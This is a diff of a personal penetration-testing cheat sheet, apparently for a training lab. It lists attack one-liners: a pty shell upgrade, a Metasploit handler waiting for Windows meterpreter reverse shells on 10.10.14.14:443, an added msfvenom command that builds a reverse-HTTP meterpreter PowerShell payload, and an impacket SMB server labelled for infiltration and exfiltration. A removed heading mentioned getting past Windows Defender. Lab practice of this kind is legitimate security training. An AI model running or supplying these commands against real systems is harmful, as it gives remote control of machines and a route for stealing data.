@@ -46,8 +46,9 @@ dd
 paste in your shell, profit
 `python -c 'import pty; pty.spawn("/bin/sh")'`
 
-## Start mult/handler for when I finally bypass defender:
+## Start mult/handler:
 `sudo msfconsole -x "use exploits/multi/handler; set lhost 10.10.14.14; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"`
+`msfvenom -p windows/x64/meterpreter_reverse_http -f psh LHOST=10.10.14.14 LPORT=443 -o l.ps1`
 
 ## Start SMB for infil/exfil:  
 `$ sudo impacket-smbserver -smb2support GUEST /home/kymb0/Desktop/backup/offshore/toolz`
